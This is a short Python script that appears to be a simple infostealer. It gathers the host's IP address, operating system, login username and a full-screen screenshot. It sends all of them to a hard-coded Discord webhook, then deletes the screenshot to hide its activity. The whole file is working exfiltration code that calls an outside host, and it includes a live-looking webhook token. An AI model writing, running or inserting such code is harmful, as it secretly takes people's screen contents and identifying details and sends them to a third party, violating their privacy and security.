import requests
import platform
import socket
from PIL import ImageGrab
import os

# Function to get system information
def get_system_info():
    ip_address = socket.gethostbyname(socket.gethostname())
    os_info = platform.system() + " " + platform.release()
    username = os.getlogin()
    return ip_address, os_info, username

# Function to take a screenshot
def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_path = os.path.join(os.path.expanduser("~"), "screenshot.png")
    screenshot.save(screenshot_path)
    return screenshot_path

# Function to send data to Discord
def send_to_discord(ip_address, os_info, username, screenshot_path):
    webhook_url = 'https://discord.com/api/webhooks/1391532249156947998/6COjLrMLUvb8Oe3uqBg0DVlPhPVWdpj7_QXNwNN9NhWLrrlFvSpAwZWrxjsvu5UOvbtm'
    message = {
        "content": f"System Information:\nIP Address: {ip_address}\nOS: {os_info}\nUsername: {username}"
    }
    
    # Send the message
    requests.post(webhook_url, json=message)
    
    # Send the screenshot
    with open(screenshot_path, 'rb') as f:
        requests.post(webhook_url, files={"file": f})

# Main function
def main():
    ip_address, os_info, username = get_system_info()
    screenshot_path = take_screenshot()
    send_to_discord(ip_address, os_info, username, screenshot_path)
    
    # Clean up the screenshot file
    os.remove(screenshot_path)

if __name__ == "__main__":
    main()
